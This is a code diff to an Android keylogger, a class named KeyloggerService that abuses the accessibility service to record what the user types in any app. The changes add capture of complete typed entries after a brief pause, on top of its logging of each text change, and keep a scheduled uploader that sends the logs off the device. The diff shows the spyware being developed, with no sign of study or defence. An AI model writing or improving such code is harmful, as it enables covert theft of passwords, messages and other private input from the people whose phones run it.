@@ -1,6 +1,4 @@
 
-
-
         package com.example.systemslog;
 
 import android.accessibilityservice.AccessibilityService;
@@ -22,21 +20,27 @@ public class KeyloggerService extends AccessibilityService {
     private String lastPackage = "";
     private Handler handler = new Handler();
 
-    private final long INTERVAL = 3 * 60 * 1000; // 3 mins (adjust as needed)
+    private final long INTERVAL = 3 * 60 * 1000; // Flush logs every 3 mins
+    private final long IDLE_DELAY = 2000; // 2 sec idle = full input typed
 
-    private final Runnable saveRunnable = new Runnable() {
-        @Override
-        public void run() {
-            flushLogs();
-            handler.postDelayed(this, INTERVAL);
-        }
-    };
+    private Runnable saveRunnable;
+    private Runnable inputIdleRunnable;
+
+    private String lastFullInputText = "";
 
     @Override
     public void onServiceConnected() {
-        handler.postDelayed(saveRunnable, INTERVAL);
-        LogUploader.scheduleUploader(this); // Background upload scheduler
+        LogUploader.scheduleUploader(this); // Schedule periodic uploads
+
         logBuffer.append("## 📲 New Keylogging Session Started — ").append(getFullTimestamp()).append("\n\n");
+
+        saveRunnable = () -> {
+            flushLogs();
+            handler.postDelayed(saveRunnable, INTERVAL);
+        };
+
+        handler.postDelayed(saveRunnable, INTERVAL);
+
         Log.d(TAG, "✅ KeyloggerService connected");
     }
 
@@ -52,9 +56,12 @@ public class KeyloggerService extends AccessibilityService {
         }
 
         switch (event.getEventType()) {
+
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                 if (event.getText() != null && !event.getText().isEmpty()) {
                     String currentText = event.getText().get(0).toString();
+
+                    // Delta logic
                     String delta = getDifference(lastText, currentText);
                     if (!delta.isEmpty()) {
                         logBuffer.append("`").append(getTimestamp()).append("` → ").append(delta).append("\n");
@@ -66,6 +73,18 @@ public class KeyloggerService extends AccessibilityService {
                         );
                         lastText = currentText;
                     }
+
+                    // Smart input capture after idle
+                    if (inputIdleRunnable != null) handler.removeCallbacks(inputIdleRunnable);
+
+                    inputIdleRunnable = () -> {
+                        if (!currentText.equals(lastFullInputText) && currentText.trim().length() > 1) {
+                            logBuffer.append("📝 `").append(getTimestamp()).append("` → **[FULL INPUT]**: `")
+                                    .append(currentText.trim()).append("`\n");
+                            lastFullInputText = currentText;
+                        }
+                    };
+                    handler.postDelayed(inputIdleRunnable, IDLE_DELAY);
                 }
                 break;
 
